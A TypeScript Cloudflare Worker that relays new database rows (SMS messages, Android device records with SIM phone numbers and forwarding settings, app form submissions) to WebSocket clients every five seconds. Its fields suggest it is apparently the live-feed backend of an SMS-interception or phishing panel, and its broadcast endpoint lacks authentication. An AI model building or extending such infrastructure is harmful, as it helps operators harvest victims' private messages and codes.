/**
 * EventBus Durable Object Worker
 * Polls Neon DB every 5s via DO Alarm and pushes live events to all
 * connected WebSocket clients regardless of which backend Android used.
 */
import { neon } from "@neondatabase/serverless";

export interface Env {
  EVENT_BUS: DurableObjectNamespace;
  NEON_DATABASE_URL: string;
}

function toDevice(r: Record<string, unknown>) {
  return {
    id: r.id, deviceId: r.device_id, appId: r.app_id, userId: r.user_id,
    name: r.name, androidVersion: r.android_version,
    sim1Carrier: r.sim1_carrier, sim1Phone: r.sim1_phone,
    sim2Carrier: r.sim2_carrier, sim2Phone: r.sim2_phone,
    status: r.status, lastOnline: r.last_online,
    forwardEnabled: r.forward_enabled, forwardSlot: r.forward_slot,
    fcmToken: r.fcm_token, installedAt: r.installed_at,
    updatedAt: r.updated_at, starred: r.starred,
  };
}
function toMessage(r: Record<string, unknown>) {
  return {
    id: r.id, appId: r.app_id, deviceId: r.device_id, userId: r.user_id,
    fromSender: r.from_sender, fromNumber: r.from_number, toNumber: r.to_number,
    body: r.body, isSensitive: r.is_sensitive,
    receivedAt: r.received_at, masterOnly: r.master_only,
  };
}
function toFormData(r: Record<string, unknown>) {
  return { id: r.id, appId: r.app_id, deviceId: r.device_id, data: r.data, submittedAt: r.submitted_at };
}

const POLL_MS = 5_000;
const LAST_KEY = "lastCheck";

export class EventBus {
  state: DurableObjectState;
  env: Env;
  constructor(state: DurableObjectState, env: Env) { this.state = state; this.env = env; }

  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);

    if (url.pathname === "/ws") {
      if (request.headers.get("Upgrade") !== "websocket")
        return new Response("Expected websocket", { status: 426 });
      const pair = new WebSocketPair();
      const [client, server] = [pair[0], pair[1]];
      this.state.acceptWebSocket(server);
      try { server.send(JSON.stringify({ event: "ping", data: { t: Date.now() } })); } catch {}
      const stored = await this.state.storage.get<number>(LAST_KEY);
      if (!stored) await this.state.storage.put(LAST_KEY, Date.now() - POLL_MS);
      const alarm = await this.state.storage.getAlarm();
      if (!alarm) await this.state.storage.setAlarm(Date.now() + POLL_MS);
      return new Response(null, { status: 101, webSocket: client });
    }

    if (url.pathname === "/broadcast" && request.method === "POST") {
      const body = (await request.json()) as { event: string; data: unknown };
      const payload = JSON.stringify(body);
      const sockets = this.state.getWebSockets();
      for (const ws of sockets) {
        try { ws.send(payload); } catch { try { ws.close(1011, "send error"); } catch {} }
      }
      return new Response(JSON.stringify({ ok: true, clients: sockets.length }),
        { headers: { "content-type": "application/json" } });
    }

    return new Response("Not found", { status: 404 });
  }

  async alarm(): Promise<void> {
    const sockets = this.state.getWebSockets();
    if (sockets.length === 0) {
      await this.state.storage.deleteAlarm();
      await this.state.storage.delete(LAST_KEY);
      return;
    }
    try {
      const lastCheck = (await this.state.storage.get<number>(LAST_KEY)) ?? (Date.now() - POLL_MS);
      const since = new Date(lastCheck).toISOString();
      const now = Date.now();
      const sql = neon(this.env.NEON_DATABASE_URL);

      const [msgs, devs, fds] = await Promise.all([
        sql("SELECT * FROM messages  WHERE received_at  > $1 ORDER BY received_at  ASC LIMIT 100", [since]),
        sql("SELECT * FROM devices   WHERE updated_at   > $1 ORDER BY updated_at   ASC LIMIT 100", [since]),
        sql("SELECT * FROM form_data WHERE submitted_at > $1 ORDER BY submitted_at ASC LIMIT 100", [since]),
      ]) as [Record<string, unknown>[], Record<string, unknown>[], Record<string, unknown>[]];

      await this.state.storage.put(LAST_KEY, now);

      const send = (payload: string) => {
        for (const ws of this.state.getWebSockets()) { try { ws.send(payload); } catch {} }
      };
      for (const r of msgs) send(JSON.stringify({ event: "message_added",  data: { appId: r.app_id, message: toMessage(r) } }));
      for (const r of devs) send(JSON.stringify({ event: "device_updated", data: toDevice(r) }));
      for (const r of fds)  send(JSON.stringify({ event: "form_data_added",data: { appId: r.app_id, formData: toFormData(r) } }));
    } catch (e) {
      console.error("[EventBus alarm] DB poll error:", e);
    }
    await this.state.storage.setAlarm(Date.now() + POLL_MS);
  }

  async webSocketMessage(_ws: WebSocket, _msg: string | ArrayBuffer): Promise<void> {}
  async webSocketClose(ws: WebSocket, code: number, _r: string, _c: boolean): Promise<void> {
    try { ws.close(code, "closed"); } catch {}
  }
  async webSocketError(ws: WebSocket, _e: unknown): Promise<void> {
    try { ws.close(1011, "error"); } catch {}
  }
}

export default {
  async fetch(_req: Request, _env: Env): Promise<Response> {
    return new Response("EventBus Worker — internal only", { status: 404 });
  },
};
